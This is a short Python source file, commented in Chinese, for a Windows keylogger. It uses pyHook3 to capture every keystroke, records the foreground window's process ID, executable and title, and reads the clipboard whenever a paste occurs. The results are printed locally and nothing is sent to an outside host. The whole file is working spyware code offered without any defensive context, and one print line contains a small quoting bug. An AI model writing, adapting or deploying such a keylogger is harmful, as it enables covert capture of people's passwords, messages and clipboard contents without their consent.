import pythoncom
import pyHook3
import win32clipboard
from ctypes import *

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():

    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 将进程ID存入变量中
    process_id = "%id" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

    # 打印
    print("[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value))

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window

    # 检测目标窗口是否转移（如果转移就监听新窗口）
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()

    # 检测击键是否为常规按键（非组合键）
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        # 如果发现粘贴事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE]-%s" % (pasted_value))
        else:
            print("[%s] % event.Key")
    return True

# 创建并注册book管理器
kl = pyHook3.HookManager()
kl.KeyDown = KeyStroke

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()